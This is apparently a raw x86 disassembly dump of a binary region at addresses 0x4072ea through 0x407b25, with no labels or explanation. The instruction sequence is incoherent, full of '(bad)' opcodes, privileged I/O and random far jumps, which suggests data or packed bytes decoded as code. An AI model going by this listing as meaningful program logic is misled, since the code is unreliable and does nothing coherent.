  4072ea:	sar    DWORD PTR [eax],cl
  4072ec:	stc    
  4072ed:	shl    DWORD PTR [eax-0x3e],0xe0
  4072f1:	pop    ecx
  4072f2:	xor    eax,0xff771093
  4072f7:	mov    dl,0x3f
  4072f9:	call   0x12e838a1
  4072fe:	(bad)  
  4072ff:	mov    eax,0x98ebba42
  407304:	or     DWORD PTR [esi-0x5ad46b9e],edx
  40730a:	xor    eax,0x56ec54c1
  40730f:	loopne 0x407300
  407311:	dec    ecx
  407312:	cwde   
  407313:	pop    ebp
  407314:	pop    DWORD PTR [ecx-0x1c1a0a6a]
  40731a:	clc    
  40731b:	das    
  40731c:	leave  
  40731d:	rcl    BYTE PTR [ecx-0x34],1
  407320:	imul   edx,DWORD PTR [bx+si+0x1257],0xa87e3b4c
  407329:	out    0x95,eax
  40732b:	aad    0xf
  40732d:	fisubr WORD PTR cs:[edx+0x51]
  407331:	out    0xe,eax
  407333:	ror    al,0xd
  407336:	mov    cl,0xda
  407338:	xchg   edx,eax
  407339:	sub    esp,DWORD PTR [ebp+0x56]
  40733c:	mov    bh,0x10
  40733e:	js     0x407365
  407340:	fidiv  DWORD PTR [ebx+0x57]
  407343:	mov    ch,BYTE PTR [ebx-0x5a]
  407346:	adc    ebx,ebp
  407348:	dec    edx
  407349:	adc    BYTE PTR [edi-0x29],al
  40734c:	push   ds
  40734d:	inc    ecx
  40734e:	push   edi
  40734f:	sbb    ebp,DWORD PTR [edx+0x3f]
  407352:	xor    BYTE PTR [ebx],bh
  407354:	mov    dl,0x24
  407356:	pop    esi
  407357:	jno    0x407314
  407359:	out    0xaa,al
  40735b:	call   0x3fc0:0x2091b0e4
  407362:	dec    ecx
  407363:	dec    esi
  407364:	jmp    0x8b9f:0x452a212e
  40736b:	mov    edx,edx
  40736d:	push   ecx
  40736e:	dec    esi
  40736f:	arpl   cx,ax
  407371:	frstor [edx+0x3d]
  407374:	nop
  407375:	jb     0x407326
  407377:	push   ebx
  407378:	das    
  407379:	in     al,0x89
  40737b:	call   0xee63:0xe2741fd8
  407382:	not    BYTE PTR ds:0xbc0de0b5
  407388:	sub    esi,DWORD PTR [esp+esi*8+0x2d08b41a]
  40738f:	hlt    
  407390:	xlat   BYTE PTR ds:[ebx]
  407391:	push   esi
  407392:	pusha  
  407393:	add    BYTE PTR [edx-0x67],dh
  407396:	and    DWORD PTR [edx-0x3f],edx
  407399:	jp     0x40736b
  40739b:	mov    WORD PTR [edx-0x25],fs
  40739e:	push   0xbe0c0ba5
  4073a3:	ds jo  0x4073d7
  4073a6:	mov    edi,0x74ef456c
  4073ab:	add    eax,0x44361685
  4073b0:	fwait
  4073b1:	sub    dh,BYTE PTR [edi-0x79366ba9]
  4073b7:	gs popf 
  4073b9:	fcmovnb st,st(4)
  4073bb:	dec    esi
  4073bc:	lea    ebx,[ebp+0x3516e525]
  4073c2:	sub    cl,BYTE PTR [eax-0x54]
  4073c5:	mov    al,0xc5
  4073c7:	dec    ebp
  4073c8:	mov    esi,0xcf57e1ba
  4073cd:	dec    esi
  4073ce:	das    
  4073cf:	or     DWORD PTR [eax],esi
  4073d1:	push   ss
  4073d2:	sub    eax,0x27a368b2
  4073d7:	(bad)  
  4073db:	fstp   DWORD PTR [edx-0x2be6261]
  4073e1:	adc    eax,0xa378ac60
  4073e6:	dec    esi
  4073e7:	xor    ebx,ebx
  4073e9:	fisub  WORD PTR [edx]
  4073eb:	repnz dec esi
  4073ed:	xor    ecx,DWORD PTR [edx+0x45be08ed]
  4073f3:	in     eax,dx
  4073f4:	loop   0x407442
  4073f6:	pop    esp
  4073f7:	sbb    eax,0x4daf2e31
  4073fc:	or     dl,BYTE PTR [ebx]
  4073fe:	xchg   ebp,eax
  4073ff:	mov    esi,0xde7dd78d
  407404:	sbb    ecx,ebx
  407406:	xchg   DWORD PTR [esi*8-0x53741da1],esi
  40740d:	repz pop esi
  40740f:	pop    ecx
  407410:	dec    esi
  407411:	daa    
  407412:	xchg   ebx,eax
  407413:	inc    ebx
  407414:	pop    ebx
  407415:	mov    edi,0xe1772684
  40741a:	shl    BYTE PTR [esi],cl
  40741c:	mov    bh,0xfb
  40741e:	mov    ebx,0x76b7268d
  407423:	loope  0x4073c6
  407425:	push   ebp
  407426:	xor    DWORD PTR [edx-0xc21f616],esi
  40742c:	rcr    dl,cl
  40742e:	pop    es
  40742f:	mov    bh,0x11
  407431:	sbb    ecx,DWORD PTR [edx+0x3b]
  407434:	mov    ebx,0xe589caa
  407439:	sub    eax,0xa42c6cf4
  40743e:	sbb    BYTE PTR [eax],dh
  407440:	push   0x47
  407442:	int3   
  407443:	jb     0x407476
  407445:	pop    esp
  407446:	inc    ebx
  407447:	ins    BYTE PTR es:[edi],dx
  407448:	or     eax,0xbc5f910c
  40744d:	mov    ecx,0x9b3956a9
  407452:	sub    esi,edi
  407454:	pop    ebx
  407455:	js     0x4074a2
  407457:	ja     0x40742d
  407459:	in     eax,0xbe
  40745b:	int3   
  40745c:	fimul  DWORD PTR [eax-0x42b71f58]
  407462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407463:	mov    DWORD PTR [edi-0x5cd1d0db],ebp
  407469:	loopne 0x4074b3
  40746b:	popf   
  40746c:	in     al,0x8a
  40746e:	cdq    
  40746f:	pop    ecx
  407470:	aad    0x22
  407472:	jle    0x40745d
  407474:	icebp  
  407475:	nop
  407476:	jns    0x4074c0
  407478:	adc    ah,dh
  40747a:	(bad)  
  40747b:	push   edi
  40747c:	out    dx,eax
  40747d:	mov    BYTE PTR [esi],ch
  40747f:	int3   
  407480:	push   0x575b465f
  407485:	dec    ecx
  407486:	jbe    0x4074c5
  407488:	mov    al,0xa6
  40748a:	fsubr  QWORD PTR [eax+0x6d]
  40748d:	repnz xchg esi,eax
  40748f:	mov    ds:0x8dad5bfa,eax
  407494:	aas    
  407495:	cli    
  407496:	or     edi,DWORD PTR [ebp-0x488ec637]
  40749c:	mov    fs,WORD PTR [edi-0x56]
  40749f:	je     0x407434
  4074a1:	add    ebp,ebx
  4074a3:	out    0x72,eax
  4074a5:	mov    BYTE PTR [eax],dl
  4074a7:	xchg   edi,eax
  4074a8:	and    BYTE PTR [edi],bh
  4074aa:	ror    bh,0xf1
  4074ad:	lahf   
  4074ae:	mov    bl,0x28
  4074b0:	(bad)  
  4074b2:	or     al,BYTE PTR ds:0x745e9855
  4074b8:	or     bl,bh
  4074ba:	je     0x407462
  4074bc:	mov    bh,0xeb
  4074be:	sub    DWORD PTR [edi+0x11afff3a],ebx
  4074c4:	and    cl,BYTE PTR [ecx]
  4074c6:	aam    0x56
  4074c8:	jbe    0x4074f4
  4074ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074cb:	adc    DWORD PTR [ecx],ebp
  4074cd:	rcl    DWORD PTR [edi],1
  4074cf:	stc    
  4074d0:	out    0xd1,al
  4074d2:	adc    eax,0xc4b8a5d
  4074d7:	push   ebp
  4074d8:	pusha  
  4074d9:	jle    0x407486
  4074db:	adc    eax,0x48720faa
  4074e0:	cli    
  4074e1:	inc    ebp
  4074e2:	clc    
  4074e3:	inc    ebx
  4074e4:	mov    esi,0x88592804
  4074e9:	pop    edi
  4074ea:	cli    
  4074eb:	or     cl,BYTE PTR [edx]
  4074ed:	ds fdiv st,st(2)
  4074f0:	pop    ds
  4074f1:	pushf  
  4074f2:	push   edi
  4074f3:	cmp    eax,0x5b82f947
  4074f8:	mov    ds:0x9f39b713,al
  4074fd:	ret    
  4074fe:	outs   dx,BYTE PTR ds:[esi]
  4074ff:	cwde   
  407500:	data16 fs fwait
  407503:	cmp    ebx,DWORD PTR ds:0xc8a67bcd
  407509:	jns    0x407563
  40750b:	cmp    edi,edx
  40750d:	and    edx,ecx
  40750f:	mov    eax,0x5dee3e85
  407514:	xor    esi,DWORD PTR [edi]
  407516:	xor    al,0x70
  407518:	inc    edi
  407519:	mov    eax,0xbe4aae9f
  40751e:	les    esp,FWORD PTR ds:0xe366382f
  407524:	jne    0x4074b3
  407526:	dec    edi
  407527:	mov    ds:0x12f74356,al
  40752c:	leave  
  40752d:	cdq    
  40752e:	int    0x31
  407530:	cmp    bl,BYTE PTR [ebp+0xb]
  407533:	ror    ecx,cl
  407535:	jne    0x40756f
  407537:	std    
  407538:	enter  0x89d6,0x68
  40753c:	cmc    
  40753d:	aad    0x58
  40753f:	sbb    eax,0xea96bf04
  407544:	cmp    cl,0x2e
  407547:	and    ebp,ecx
  407549:	xor    dh,bl
  40754b:	jp     0x407555
  40754d:	dec    DWORD PTR [eax+0x6752855e]
  407553:	cmp    DWORD PTR [esi-0x71],esp
  407556:	pop    edx
  407557:	cli    
  407558:	(bad)  
  407559:	cmc    
  40755a:	add    dh,al
  40755c:	loope  0x40759a
  40755e:	cmp    bh,ah
  407560:	or     BYTE PTR [ecx+ebx*4-0x5f],0x46
  407565:	sbb    ebx,DWORD PTR [edi+0x1c4a2820]
  40756b:	mov    al,0x69
  40756d:	jmp    0xce30:0x4faf1bd5
  407574:	leave  
  407575:	test   BYTE PTR [eax+0x63],ah
  407578:	mov    cl,0x67
  40757a:	sub    ebp,DWORD PTR [esi+0x4]
  40757d:	test   al,0x66
  40757f:	cmp    dl,BYTE PTR [esi-0x33]
  407582:	cmp    al,0xd9
  407584:	push   cs
  407585:	pop    edi
  407586:	pop    ds
  407587:	cmp    eax,0x341e63bc
  40758c:	dec    esi
  40758d:	adc    ecx,ebx
  40758f:	sbb    DWORD PTR [ebx-0x19],ebp
  407592:	and    DWORD PTR [ecx+ebp*1-0x63ccf5f3],ecx
  407599:	in     al,0xa9
  40759b:	(bad)  
  40759c:	sub    al,0x6
  40759e:	out    0x3e,al
  4075a0:	out    dx,eax
  4075a1:	inc    edi
  4075a2:	(bad)  
  4075a3:	(bad)  
  4075a4:	add    eax,0x3ce5a507
  4075a9:	lock cmp al,bh
  4075ac:	bound  edx,QWORD PTR [esi]
  4075ae:	cmc    
  4075af:	out    0xc0,eax
  4075b1:	mov    ss,edi
  4075b3:	xchg   BYTE PTR [edi+0x8],cl
  4075b6:	in     al,0xb3
  4075b8:	sti    
  4075b9:	adc    BYTE PTR [eax+0x79],al
  4075bc:	into   
  4075bd:	rcl    DWORD PTR [ecx-0x1a7aef64],1
  4075c3:	aaa    
  4075c4:	pop    eax
  4075c5:	or     eax,0xf4237d2c
  4075ca:	ins    DWORD PTR es:[edi],dx
  4075cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075cc:	mov    bl,0x81
  4075ce:	es add al,0x2
  4075d1:	mov    ds:0x333862df,eax
  4075d6:	icebp  
  4075d7:	add    eax,0x7a95516d
  4075dc:	lahf   
  4075dd:	or     BYTE PTR [eax],0x2e
  4075e0:	xor    BYTE PTR [ecx],0x4b
  4075e3:	jmp    0x407660
  4075e5:	inc    ecx
  4075e6:	out    dx,eax
  4075e7:	adc    eax,0xa6f4b0e2
  4075ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ed:	xchg   esp,eax
  4075ee:	(bad)  
  4075ef:	pop    ebx
  4075f0:	leave  
  4075f1:	ret    
  4075f2:	fst    QWORD PTR [eax]
  4075f4:	iret   
  4075f5:	imul   esi
  4075f7:	jmp    0x222a:0x48b300fb
  4075fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ff:	inc    edx
  407600:	xchg   DWORD PTR [esp+eax*1],esp
  407603:	mov    edi,0x34d4baca
  407608:	dec    eax
  407609:	sar    BYTE PTR [ecx-0x5c],0x7c
  40760d:	cs cwde 
  40760f:	iret   
  407610:	mov    esp,0xc9449c77
  407615:	inc    edi
  407616:	cli    
  407617:	popa   
  407618:	loope  0x40767a
  40761a:	pop    ss
  40761b:	jne    0x407684
  40761d:	imul   ecx,DWORD PTR [edx-0x7f],0xfffffff9
  407621:	sub    DWORD PTR [ecx+0x48],ebx
  407624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407625:	outs   dx,DWORD PTR ds:[esi]
  407626:	jae    0x40763b
  407628:	inc    ebp
  407629:	call   0x334be886
  40762e:	mov    ah,0x23
  407630:	and    eax,0x54e8e7ce
  407635:	pop    ebp
  407636:	aad    0xd8
  407638:	loopne 0x4075cf
  40763a:	outs   dx,BYTE PTR ds:[esi]
  40763b:	xchg   esp,eax
  40763c:	aas    
  40763d:	mov    eax,0x8558cf94
  407642:	std    
  407643:	inc    edi
  407644:	jne    0x40768a
  407646:	rol    BYTE PTR [ecx-0x47691331],1
  40764c:	add    eax,0x15eea2cf
  407651:	out    0x87,al
  407653:	jmp    FWORD PTR [eax]
  407655:	jns    0x40767b
  407657:	sub    al,0xaf
  407659:	mov    ?,WORD PTR [edx+0x3cd99406]
  40765f:	ret    
  407660:	fmul   DWORD PTR ds:0x2b9d644c
  407666:	out    0x92,al
  407668:	fxch   st(7)
  40766a:	sbb    bh,al
  40766c:	push   cs
  40766d:	mov    cl,0xb1
  40766f:	outs   dx,BYTE PTR ds:[esi]
  407670:	push   edx
  407671:	sbb    BYTE PTR [ecx-0x7e],ah
  407674:	cdq    
  407675:	adc    edi,esp
  407677:	sbb    bh,0xf5
  40767a:	jne    0x407655
  40767c:	mov    al,BYTE PTR [ebp-0x748b7f10]
  407682:	ins    BYTE PTR es:[edi],dx
  407683:	push   ds
  407684:	cmp    DWORD PTR [ebx+0x16],ebp
  407687:	cs mov bp,0x41ef
  40768c:	pop    edx
  40768d:	mov    BYTE PTR ds:0xe958fdbf,bl
  407693:	mov    ah,0xc6
  407695:	and    DWORD PTR [ecx-0x59156d9f],0x9a1a245c
  40769f:	aaa    
  4076a0:	shl    ch,cl
  4076a2:	sub    ebp,DWORD PTR [ebx+0x44a27fdf]
  4076a8:	loopne 0x40762e
  4076aa:	adc    eax,0x2a72d03e
  4076af:	std    
  4076b0:	mov    dh,0x89
  4076b2:	fmul   QWORD PTR [ecx-0x7e]
  4076b5:	add    ah,BYTE PTR [esp+ebp*1-0x6d]
  4076b9:	xchg   ebp,esp
  4076bb:	inc    esi
  4076bc:	icebp  
  4076bd:	js     0x4076b0
  4076bf:	scas   eax,DWORD PTR es:[edi]
  4076c0:	mov    al,0xe
  4076c2:	mov    eax,0x8eed74db
  4076c7:	les    esi,FWORD PTR [ecx+ebx*8-0x287a5c6d]
  4076ce:	dec    esp
  4076cf:	jmp    DWORD PTR [ecx+0x35]
  4076d2:	xchg   edx,eax
  4076d3:	lds    esi,FWORD PTR [ecx]
  4076d5:	cmp    esi,DWORD PTR [edx]
  4076d7:	add    eax,0x82b38a8c
  4076dc:	dec    edx
  4076dd:	adc    BYTE PTR [edx-0xbf8b5b9],ah
  4076e3:	or     al,0x39
  4076e5:	sub    DWORD PTR [esi+esi*4],0x36
  4076e9:	jmp    0xf953:0xb8fc5e7d
  4076f0:	sub    DWORD PTR [ecx-0x6c4a9bc7],eax
  4076f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f7:	inc    edi
  4076f8:	aas    
  4076f9:	fucomp st(2)
  4076fb:	loope  0x407758
  4076fd:	mov    edx,DWORD PTR [eax]
  4076ff:	jb     0x40776b
  407701:	mov    WORD PTR [ebp+0x35ed0aa1],?
  407707:	cdq    
  407708:	imul   BYTE PTR [ecx*4+0x797cb5ec]
  40770f:	push   0x29
  407711:	jb     0x407778
  407713:	(bad)  
  407714:	jg     0x407768
  407716:	add    ah,BYTE PTR [edx]
  407718:	dec    ecx
  407719:	push   eax
  40771a:	aam    0x12
  40771c:	or     ebx,DWORD PTR [ecx-0x34]
  40771f:	mov    edx,0xf5725d9d
  407724:	repz adc edx,DWORD PTR [edi+ebx*4+0x3746e3db]
  40772c:	xchg   edx,eax
  40772d:	lock mov WORD PTR [ebp+ebx*8-0x2],es
  407732:	or     bh,BYTE PTR [esi]
  407734:	sbb    eax,0x5472a9e0
  407739:	cmp    al,0xee
  40773b:	or     BYTE PTR [edx-0x6ff54b47],ah
  407741:	jbe    0x4076d2
  407743:	dec    ebp
  407744:	add    al,0xd4
  407746:	scas   eax,DWORD PTR es:[edi]
  407747:	call   0xd6e1b816
  40774c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40774d:	out    dx,al
  40774e:	xor    al,0x1c
  407750:	loope  0x4076fb
  407752:	pop    esp
  407753:	(bad)  
  407754:	add    eax,0xff43d6b3
  407759:	push   eax
  40775a:	out    dx,eax
  40775b:	pop    es
  40775c:	or     bh,bh
  40775e:	sub    eax,0x13509918
  407763:	push   esp
  407764:	sub    ch,bl
  407766:	rol    BYTE PTR [ebx+0x6d],0x60
  40776a:	aad    0x1b
  40776c:	shl    ecx,cl
  40776e:	stos   BYTE PTR es:[edi],al
  40776f:	sub    BYTE PTR [eax*2+0x14fb1df7],0x12
  407777:	lock mov ds:0x28faffd,eax
  40777d:	repnz mov bh,0x83
  407780:	lahf   
  407781:	inc    esi
  407782:	jl     0x407735
  407784:	cli    
  407785:	aaa    
  407786:	pop    eax
  407787:	ss mov dl,0x73
  40778a:	lds    ebp,FWORD PTR ds:0xff4834f
  407790:	das    
  407791:	ret    0x4857
  407794:	jle    0x407753
  407796:	push   es
  407797:	xor    DWORD PTR [ebp+0x6c50f001],ebx
  40779d:	int    0xc0
  40779f:	cwde   
  4077a0:	ins    DWORD PTR es:[edi],dx
  4077a1:	cmp    DWORD PTR [esp+ebp*4+0x49],ecx
  4077a5:	ins    DWORD PTR es:[edi],dx
  4077a6:	add    eax,0x13579214
  4077ab:	rcl    BYTE PTR [ebx+0x43bcbb69],cl
  4077b1:	fwait
  4077b2:	mov    edi,0xcd82ec1b
  4077b7:	push   ss
  4077b8:	xor    al,0x61
  4077ba:	mov    ds,WORD PTR [eax+0x8978beb]
  4077c0:	aad    0xfe
  4077c2:	sbb    BYTE PTR [ebp-0x37261890],dl
  4077c8:	mov    edx,0x9470e165
  4077cd:	dec    esp
  4077ce:	iret   
  4077cf:	rcr    ecx,0x9d
  4077d2:	loopne 0x4077c2
  4077d4:	repz call 0xaccbc197
  4077da:	mov    ch,0x5d
  4077dc:	sbb    BYTE PTR [eax+0x56c257c1],cl
  4077e2:	imul   DWORD PTR [eax]
  4077e4:	enter  0xf903,0x34
  4077e8:	add    DWORD PTR [ebp+0x66],esp
  4077eb:	add    al,0xfd
  4077ed:	inc    ecx
  4077ee:	inc    edx
  4077ef:	test   al,0x65
  4077f1:	cmc    
  4077f2:	add    al,0x67
  4077f4:	les    ebx,FWORD PTR [ecx+0x2b]
  4077f7:	cmp    edx,DWORD PTR [edx+0x556a79f9]
  4077fd:	pop    esp
  4077fe:	add    eax,0xd834f108
  407803:	add    DWORD PTR [esi+0x66],0x20
  407807:	mov    dh,0x1
  407809:	jle    0x4077c3
  40780b:	sbb    ecx,DWORD PTR [ebp-0x71]
  40780e:	repnz mov edx,0xca811f36
  407814:	jbe    0x4077aa
  407816:	mov    edx,0xf3b5617f
  40781b:	pop    esi
  40781c:	das    
  40781d:	cmp    DWORD PTR [ebp+0x6e46677b],edi
  407823:	out    dx,eax
  407824:	cmp    BYTE PTR [ecx-0x1a8bcf17],dh
  40782a:	mov    ?,WORD PTR [esp+eiz*2]
  40782d:	mov    ds:0xa43d8f58,eax
  407832:	xchg   ecx,eax
  407833:	repnz pop ecx
  407835:	xor    ch,BYTE PTR [edx-0x70]
  407838:	xchg   ebp,eax
  407839:	mov    edx,0x59e21d66
  40783e:	gs out 0x86,al
  407841:	cmp    ebx,DWORD PTR [ebx]
  407843:	in     eax,dx
  407844:	jnp    0x4078b3
  407846:	push   edx
  407847:	gs xchg esi,eax
  407849:	or     al,0x96
  40784b:	add    al,0x22
  40784d:	and    eax,ebx
  40784f:	les    esi,FWORD PTR [esi+0x5b]
  407852:	cmp    ebx,ebx
  407854:	cmp    dl,BYTE PTR [eax+eax*8]
  407857:	(bad)  
  407858:	sub    bl,bh
  40785a:	pop    eax
  40785b:	xchg   edx,eax
  40785c:	loopne 0x40780d
  40785e:	sti    
  40785f:	cmp    dl,BYTE PTR es:[eax+0x1372f72b]
  407866:	fimul  WORD PTR [ebp-0x6f816edd]
  40786c:	arpl   WORD PTR [esi+edi*1-0x235e8d09],ax
  407873:	jo     0x40785d
  407875:	sbb    edx,DWORD PTR [eax+0x5a29de38]
  40787b:	mov    DWORD PTR [esi+ebx*4],0xea46381
  407882:	push   edi
  407883:	(bad)  
  407885:	xor    eax,0xf888599
  40788a:	out    0x2e,eax
  40788c:	xor    al,0x38
  40788e:	mov    ds:0x69ba1e2a,al
  407893:	mov    esp,0xeba75c57
  407898:	pop    eax
  407899:	mov    ebp,0x24120baa
  40789e:	mov    ch,0xb1
  4078a0:	and    dh,BYTE PTR [esi]
  4078a2:	retf   0x9393
  4078a5:	ins    DWORD PTR es:[edi],dx
  4078a6:	inc    eax
  4078a7:	aaa    
  4078a8:	xor    BYTE PTR [edx-0x67],ch
  4078ab:	rcr    DWORD PTR fs:[ebp+0x2f],0x68
  4078b0:	xchg   esp,eax
  4078b1:	lock and eax,0x75c10297
  4078b7:	bnd js 0x40788f
  4078ba:	mov    dh,0x6c
  4078bc:	pop    ds
  4078bd:	xor    ecx,DWORD PTR [ecx-0x441f212]
  4078c3:	retf   
  4078c4:	mov    ah,0x9e
  4078c6:	xchg   edx,eax
  4078c7:	mov    ds:0x2ca4a69c,al
  4078cc:	pushf  
  4078cd:	repnz lock lock nop
  4078d1:	bnd jbe 0x40788d
  4078d4:	push   ss
  4078d5:	call   0x7554ae61
  4078da:	out    0x60,al
  4078dc:	cwde   
  4078dd:	clc    
  4078de:	or     ebx,DWORD PTR [ebx]
  4078e0:	cmp    al,BYTE PTR [edx-0x230d24d6]
  4078e6:	push   ebx
  4078e7:	imul   ebp,DWORD PTR [ecx+0x330018c2],0x29
  4078ee:	lock in eax,0xab
  4078f1:	fmul   QWORD PTR [ecx-0x93ec7f0]
  4078f7:	mov    ebp,0xc26bce29
  4078fc:	mov    ecx,esi
  4078fe:	dec    ebx
  4078ff:	jmp    0x4078a2
  407901:	pop    ebp
  407902:	gs jnp 0x4078e7
  407905:	xlat   BYTE PTR ds:[ebx]
  407906:	and    al,0x65
  407908:	or     bl,dh
  40790a:	inc    edx
  40790b:	pop    edx
  40790c:	jae    0x407965
  40790e:	lods   al,BYTE PTR ds:[esi]
  40790f:	add    al,BYTE PTR [edi+eax*8+0x54]
  407913:	aad    0x98
  407915:	add    esp,ecx
  407917:	cld    
  407918:	push   esi
  407919:	pop    esp
  40791a:	sub    ecx,ecx
  40791c:	lahf   
  40791d:	and    BYTE PTR [ebp+0x1f],0xbb
  407921:	hlt    
  407922:	mov    ecx,0x7c0c07e7
  407927:	sbb    BYTE PTR [esi+ecx*4],cl
  40792a:	mov    esi,?
  40792c:	xchg   ebx,eax
  40792d:	idiv   BYTE PTR [ebx-0x54]
  407930:	jae    0x407921
  407932:	arpl   bx,cx
  407934:	lea    eax,[edx+0x50]
  407937:	popf   
  407938:	rcr    BYTE PTR [eax],1
  40793a:	ins    BYTE PTR es:[edi],dx
  40793b:	mov    eax,ds:0x40bd0281
  407940:	les    ecx,FWORD PTR [ecx-0x20bd4774]
  407946:	lock scas al,BYTE PTR es:[edi]
  407948:	arpl   WORD PTR [esi],si
  40794a:	xchg   edx,eax
  40794b:	clc    
  40794c:	inc    eax
  40794d:	jns    0x4079c2
  40794f:	imul   ebx,DWORD PTR [eax],0xe29793bc
  407955:	jmp    0x45dc4281
  40795a:	mov    bl,0xdb
  40795c:	push   es
  40795d:	sub    DWORD PTR [ebx-0x64c21a95],esi
  407963:	cmc    
  407964:	mov    WORD PTR [ecx-0x380f810d],?
  40796a:	cmc    
  40796b:	pop    esi
  40796c:	cmp    BYTE PTR [ebx],ah
  40796e:	sub    BYTE PTR [esi-0x6cde6d5f],bh
  407974:	call   0x2d78:0x6e95f65c
  40797b:	mov    ah,0x2d
  40797d:	call   0xe87d8fcb
  407982:	leave  
  407983:	pushf  
  407984:	mov    ds:0xa21c9474,al
  407989:	aam    0x79
  40798b:	pop    ebx
  40798c:	and    bh,BYTE PTR [ebx]
  40798e:	mov    ds:0x9eec5668,al
  407993:	mov    bh,0x5a
  407995:	stos   DWORD PTR es:[edi],eax
  407996:	arpl   WORD PTR [esi-0x7660262],dx
  40799c:	mov    edx,0xb9b4a6e3
  4079a1:	repnz push 0xdfe5acb1
  4079a7:	ror    dl,cl
  4079a9:	out    0xf9,eax
  4079ab:	cmp    al,0x58
  4079ad:	loop   0x4079f2
  4079af:	add    DWORD PTR [edi+0x1a83b8d1],edi
  4079b5:	test   BYTE PTR [edi-0x5a],0xd6
  4079b9:	mov    al,BYTE PTR [ebp+0x7aefef49]
  4079bf:	(bad)  [edx-0x53f23559]
  4079c5:	pop    es
  4079c6:	daa    
  4079c7:	call   0xeed4fef1
  4079cc:	aaa    
  4079cd:	lea    edi,[ebx+0x162d600f]
  4079d3:	add    DWORD PTR [ebp-0x2e],ebx
  4079d6:	ins    BYTE PTR es:[edi],dx
  4079d7:	pusha  
  4079d8:	or     eax,0x95d8b853
  4079dd:	xor    eax,0xce51a000
  4079e2:	or     bl,BYTE PTR [edx+0x30a06209]
  4079e8:	in     eax,0x34
  4079ea:	bnd cs jg 0x407a2c
  4079ee:	push   esp
  4079ef:	mov    esi,0xbc9c265
  4079f4:	scas   al,BYTE PTR es:[edi]
  4079f5:	jmp    0x88b11f8e
  4079fa:	xchg   esi,eax
  4079fb:	into   
  4079fc:	jnp    0x4079aa
  4079fe:	xor    ch,0xc4
  407a01:	inc    edi
  407a02:	mov    esi,0x4d323670
  407a07:	cmp    eax,0x25
  407a0a:	sub    al,0xb1
  407a0c:	mov    bh,0x5b
  407a0e:	xchg   ebp,eax
  407a0f:	push   ebp
  407a10:	pop    edx
  407a11:	loope  0x4079d2
  407a13:	data16 cmp ah,BYTE PTR [edi+0xebd0fd4]
  407a1a:	fnstenv [ecx+0x4c]
  407a1d:	sub    ecx,DWORD PTR [edi+0x38a68241]
  407a23:	iret   
  407a24:	mov    cl,0xde
  407a26:	dec    edi
  407a27:	mov    esi,0x489f908e
  407a2c:	aas    
  407a2d:	jno    0x407a0e
  407a2f:	int    0x2b
  407a31:	mul    BYTE PTR [eax+eax*1+0x6f]
  407a35:	fisttp QWORD PTR [esi]
  407a37:	adc    bh,BYTE PTR [ecx+edx*1+0x38]
  407a3b:	mov    ah,0x17
  407a3d:	outs   dx,DWORD PTR ds:[esi]
  407a3e:	hlt    
  407a3f:	pop    es
  407a40:	push   ds
  407a41:	push   es
  407a42:	push   ds
  407a43:	fisub  WORD PTR [edx]
  407a45:	fwait
  407a46:	xor    dh,BYTE PTR [ebp-0x24]
  407a49:	test   eax,0x908d7705
  407a4e:	cmp    al,0xfa
  407a50:	jge    0x407a30
  407a52:	sbb    eax,0x7b72d3a2
  407a57:	push   eax
  407a58:	stos   DWORD PTR es:[edi],eax
  407a59:	xor    al,ah
  407a5b:	mov    edi,0x399cdf82
  407a60:	or     al,BYTE PTR [edx]
  407a62:	leave  
  407a63:	xlat   BYTE PTR ds:[ebx]
  407a64:	pop    ebx
  407a65:	frstor [ecx+0xd]
  407a68:	popf   
  407a69:	lea    eax,[ebx-0x5f5747aa]
  407a6f:	lldt   sp
  407a72:	jp     0x407aa7
  407a74:	cmp    DWORD PTR [ebx-0x25],ecx
  407a77:	out    0x2e,al
  407a79:	mov    al,0xcf
  407a7b:	aad    0x5
  407a7d:	sub    eax,0x5d8195fd
  407a82:	xchg   eax,ebp
  407a84:	nop
  407a85:	dec    ebx
  407a86:	mov    eax,0x3c96326a
  407a8b:	mov    eax,ds:0x3b635cf8
  407a90:	mov    ds:0xeb365787,eax
  407a95:	dec    eax
  407a97:	aas    
  407a98:	out    0x57,eax
  407a9a:	jl     0x407a77
  407a9c:	dec    ebx
  407a9d:	add    eax,0x55b21e32
  407aa2:	cmp    BYTE PTR [ebp+0x2cfccd23],cl
  407aa8:	sbb    DWORD PTR [ecx],esp
  407aaa:	sub    eax,0x4f1539ea
  407aaf:	div    DWORD PTR [edi-0x62]
  407ab2:	adc    eax,0x468b68ac
  407ab7:	jne    0x407ac0
  407ab9:	(bad)  
  407aba:	not    al
  407abc:	leave  
  407abd:	mov    dh,0xa9
  407abf:	int    0xc9
  407ac1:	jns    0x407a95
  407ac3:	mov    ch,0xce
  407ac5:	call   FWORD PTR [ebp+0x6d]
  407ac8:	fidivr DWORD PTR [ebx+0x1986141e]
  407ace:	stc    
  407acf:	int    0xdb
  407ad1:	cmc    
  407ad2:	inc    esp
  407ad3:	add    DWORD PTR [ebx+0x1c],ecx
  407ad6:	jbe    0x407af8
  407ad8:	mov    al,0xf1
  407ada:	lds    ebx,FWORD PTR ds:0x61d752ed
  407ae0:	test   al,0x6d
  407ae2:	adc    cl,BYTE PTR [esi]
  407ae4:	les    ebp,FWORD PTR [ebx]
  407ae6:	sub    ebp,DWORD PTR [edi-0x5181c0a0]
  407aec:	jecxz  0x407b5e
  407aee:	sbb    eax,0xe5a2ae5a
  407af3:	mov    ds:0xdcfc9a87,al
  407af8:	lods   eax,DWORD PTR ds:[esi]
  407af9:	rcr    DWORD PTR [ecx],1
  407afb:	jne    0x407b50
  407afd:	pop    edx
  407afe:	dec    ebp
  407aff:	(bad)  
  407b01:	jle    0x407aee
  407b03:	mov    al,0xf
  407b05:	mov    cl,0xa4
  407b07:	(bad)  
  407b08:	retf   0x5dc2
  407b0b:	push   ebp
  407b0c:	lds    edx,FWORD PTR ds:0x47c08518
  407b12:	fidiv  WORD PTR [ecx-0x63e0068c]
  407b18:	xor    BYTE PTR [edx-0x1e6f7560],dl
  407b1e:	pop    ss
  407b1f:	fistp  QWORD PTR [edx-0x2e55a84d]
  407b25:	adc    edi,DWORD PTR [edi+0xf]
